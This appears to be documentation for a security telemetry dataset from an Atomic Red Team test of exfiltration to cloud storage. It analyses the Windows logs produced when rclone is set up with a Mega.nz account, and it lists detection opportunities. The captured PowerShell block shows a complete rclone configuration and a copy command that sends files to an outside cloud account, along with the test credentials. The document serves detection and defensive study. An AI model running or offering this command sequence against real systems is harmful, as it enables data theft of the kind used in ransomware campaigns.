# T1567.002-1: Exfiltration to Cloud Storage — Windows

## Technique Context

T1567.002 (Exfiltration to Cloud Storage) covers adversaries using legitimate cloud storage
services and sync tools to exfiltrate data, blending outbound traffic into normal business
activity. `rclone` is a command-line cloud storage synchronization tool that supports over
40 storage providers including Mega, Google Drive, and S3. It has been used in documented
ransomware campaigns (notably BlackCat/ALPHV and Cl0p) as a staging tool before encryption,
copying victim data to attacker-controlled cloud accounts. This test configures rclone with
a Mega.nz account and copies up to 1700KB of data.

## What This Dataset Contains

The dataset spans approximately 6 seconds (14:28:56–14:29:02 UTC) from ACME-WS02.

**PowerShell 4104 (Script Block Logging)** captures the complete rclone configuration and
execution sequence:

```
New-Item $env:appdata\rclone -ItemType directory
New-Item $env:appdata\rclone\rclone.conf
cd "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1567.002\rclone-v*\"
.\rclone.exe config create T1567002 mega
set-Content $env:appdata\rclone\rclone.conf "[T1567002]
 type = mega
 user = atomictesting@outlook.com
 pass = vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
.\rclone.exe copy --max-size 1700k "C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1567.002" T1567002:test -v
```

This reveals the rclone configuration file format, the Mega account credentials used
(test-only credentials from the ART project), and the copy command with a 1700KB cap.

**Sysmon Event 1 (Process Create)** captures:
- `whoami.exe` (ART pre-flight, tagged T1033)
- `powershell.exe` with the full rclone command block (tagged T1083 File and Directory
  Discovery, because the PS command begins with `New-Item` creating a directory)

**Sysmon Event 11 (File Created)** captures:
- `C:\Windows\System32\config\systemprofile\AppData\Roaming\rclone` (directory creation)
- `C:\Windows\System32\config\systemprofile\AppData\Roaming\rclone\rclone.conf` (config file)

Note: The `%APPDATA%` path for SYSTEM resolves to the system profile path, not a user profile.
The config file write is tagged `technique_id=T1574.010,technique_name=Services File
Permissions Weakness` by the sysmon-modular ruleset (any file write to an AppData path under
a privileged account triggers this rule).

**Sysmon Event 17 (Pipe Created)** captures `\PSHost.*` named pipes for each PowerShell
instance.

**Sysmon Event 7 (Image Load)** and **Event 10 (Process Access)** record standard PowerShell
DLL loading and process access patterns.

**Security 4688/4689** record process lifecycle for `powershell.exe` and `whoami.exe` under
SYSTEM.

## What This Dataset Does Not Contain (and Why)

**No rclone.exe process create event.** The sysmon-modular include-mode ProcessCreate rules
do not match `rclone.exe` by name. Since `rclone.exe` is invoked as a child of PowerShell
from the `ExternalPayloads` directory, it does not match any LOLBin rule. Security 4688 also
does not capture it — the Security log was filtered to the test's 5-second window, and 4688
events for child processes are present only for processes that match the audit policy scope
in that window. The Security log shows only SYSTEM-context PowerShell and pre-flight `whoami`.

**No Sysmon network connection for rclone.** Sysmon Event 3 (Network Connection) is collected
for this host, but no outbound connection to Mega.nz appears. This suggests the rclone copy
either failed (invalid credentials, no network route to Mega), timed out, or the connection
was made after the collection window closed.

**No DNS query for Mega.** Sysmon Event 22 would capture a `mega.nz` or `g.api.mega.co.nz`
lookup if rclone attempted a connection. Its absence reinforces the likelihood that the
actual upload did not succeed.

**No file read events.** Object access auditing is disabled in this environment (policy shows
`object_access: none`), so there are no events recording which files rclone read from the
source directory.

## Assessment

The highest-value signal is in PowerShell 4104: the complete rclone configuration block
including the destination type (`mega`), account identifier, and the `copy` command with
`--max-size` throttling (a technique used by operators to avoid bandwidth alerts). The rclone
config file creation at `AppData\Roaming\rclone\rclone.conf` in Sysmon Event 11 provides
a filesystem artifact that matches what threat intelligence has documented in real rclone-based
exfiltration campaigns.

The absence of network evidence means this dataset represents attempt telemetry rather than
confirmed exfiltration. The PowerShell and filesystem artifacts are sufficient for detection
in a mature environment.

## Detection Opportunities Present in This Data

- **PowerShell 4104**: `rclone.exe copy` with provider keywords (`mega`, `s3`, `gdrive`) and
  `--max-size` or `--transfers` flags is highly specific to exfiltration tooling. The rclone
  config content in script blocks reveals the destination provider and account credentials.

- **Sysmon Event 11**: Creation of `rclone.conf` in any AppData or user profile path is
  high-fidelity. Legitimate rclone users configure it interactively, not from script blocks
  running as SYSTEM.

- **Security 4688**: `powershell.exe` command line containing `rclone.exe`, `config create`,
  or `set-Content` with a cloud provider type string is anomalous.

- **Sysmon Event 1**: `rclone.exe` in process create events from a non-standard directory
  warrants investigation; correlate with parent (PowerShell) and command-line content.

- **Network (not in this dataset)**: Outbound connections to `g.api.mega.co.nz` or the
  `mega.nz` infrastructure from `rclone.exe` would be the definitive exfiltration signal.
